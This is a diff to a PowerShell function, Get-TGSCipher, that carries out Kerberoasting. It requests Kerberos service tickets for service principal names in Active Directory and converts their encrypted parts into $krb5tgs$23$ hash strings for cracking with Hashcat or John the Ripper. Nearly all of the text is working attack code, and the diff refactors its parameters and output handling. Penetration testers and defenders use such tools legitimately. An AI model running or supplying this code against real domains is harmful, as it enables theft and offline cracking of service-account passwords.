@@ -28,18 +28,15 @@ function Get-TGSCipher
     .PARAMETER NoQuery
         Do not query Acitve Directory (LDAP) to determine the user prinicipal name (UPN) which runs under the SPN.
 
-    .PARAMETER ConvertTo
-        Convert the output to a diffrenet format. Options are Hashcat, John (John the Ripper), Kerberoast.
-
-    .PARAMETER SaveTo
-        Save the output to a file. Requires full path.
+    .PARAMETER Format
+        Convert the output to a diffrenet format. Options are Hashcat, John (John the Ripper) and Kerberoast.
 
     .EXAMPLE 
         Get-TGSCipher -SPN "MSSQLSvc/SQLServer.lab.com:1433"
         Request a Kerberos TGS for MSSQLSvc/SQLServer.lab.com:1433 and return the target UPN, encryption type and the encrypted part of the ticket.
 
     .EXAMPLE 
-        Get-TGSCipher -SPN "HTTP/WebServer.lab.com" -ConvertTo Hashcat 
+        Get-TGSCipher -SPN "HTTP/WebServer.lab.com" -Format Hashcat 
         Request a Kerberos TGS for HTTP/WebServer.lab.com and return the ticket in Hashcat format.
 
     .EXAMPLE
@@ -55,7 +52,7 @@ function Get-TGSCipher
         [string]$SPN,
         [parameter(Mandatory=$false, Position=1)]
         [ValidateSet("Hashcat","John", "Kerberoast")]
-        [string]$ConvertTo,
+        [string]$Format,
         [Switch]$NoQuery
     )
 
@@ -69,7 +66,7 @@ function Get-TGSCipher
             $Searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
         }
         Add-Type -AssemblyName System.IdentityModel
-        $CrackList = @()        
+        $TargetList = @()        
         Write-Verbose "Starting to request SPNs"
     }
     Process {
@@ -86,8 +83,8 @@ function Get-TGSCipher
             $ByteStream = $Ticket.GetRequest()
         }
         catch {
-            Write-Warning "Could not request TGS for the SPN: $SPN"
-            Write-Verbose "Make sure the SPN: $SPN is mapped on Active Directory" 
+            Write-Warning "Could not request a TGS for the SPN: $SPN - Is it exists?"
+            Write-Verbose "Make sure the SPN: $SPN is registed on Active Directory" 
         }
         if ($ByteStream)
         {
@@ -117,46 +114,31 @@ function Get-TGSCipher
     }
     End {
         if (!$TargetList.EncTicketPart) {
-            Write-Host "Could not retrieve any tickets!"
+            Write-Warning "Could not retrieve any tickets!"
         }
-        if ($ConvertTo)
+        elseif ($Format)
         {
             $Output = @()
-            if ($ConvertTo -eq "Hashcat")
-            {
-                Write-Verbose "Converting to hashcat format"
-                foreach ($Target in $TargetList) {
-                    if ($Target.EncryptionType -eq "RC4-HMAC (23)") {
+            Write-Verbose "Converting $($TargetList.Count) tickets to $Format format"
+            foreach ($Target in $TargetList) {
+                if ($Target.EncryptionType -eq "RC4-HMAC (23)") {
+                    if ($Format -eq "Kerberoast") {
+                        [string]$Output += $Target.EncTicketPart + "\n"
+                    }
+                    elseif (($Format -eq "John") -or ($Format -eq "Hashcat")) {
                         $Account = $Target.Target -split "@"
                         $Output += "`$krb5tgs`$23`$*$($Account[0])`$$($Account[1])`$$($Target.SPN)*`$" + $Target.EncTicketPart.Substring(0,32) + "`$" + $Target.EncTicketPart.Substring(32)
                     }
-                    else {
-                        Write-Warning "$SPN couldn't be cracked with Hashcat. Currently Hashcat supports RC4-HMAC only)"
-                    }
                 }
-            }
-            elseif ($ConvertTo -eq "John")
-            {
-                Write-Verbose "Converting to JtR format"
-                foreach ($Target in $TargetList) {
-                    if ($Target.EncryptionType -eq "RC4-HMAC (23)") {
-                        $Account = $Target.Target -split "@"
-                        $Output += "`$krb5tgs`$23`$*$($Account[0])`$$($Account[1])`$$($Target.SPN)*`$" + $Target.EncTicketPart.Substring(0,32) + "`$" + $Target.EncTicketPart.Substring(32)  
-                    }
-                    else {
-                        Write-Warning "$SPN couldn't be cracked with John. Currently John supports RC4-HMAC only)"
-                    }
+                else {
+                    Write-Warning "The ticket of SPN: $($Target.SPN) is encrypted with $($Target.EncryptionType) encrytiopn and couldn't be cracked with $Format. Currently only RC4-HMAC is supported)"
                 }
-            }
-            elseif ($ConvertTo -eq "Kerberoast")
-            {
-                Write-Verbose "Converting to Kerberoast format"
-                [string]$Output = $TargetList.EncTicketPart -join "\n"
             }
         }
         else {
-            return $TargetList
+            $Output = $TargetList
         }
+        Write-Verbose "returing $($Output.Count) tickets"
         return $Output 
     } 
 }
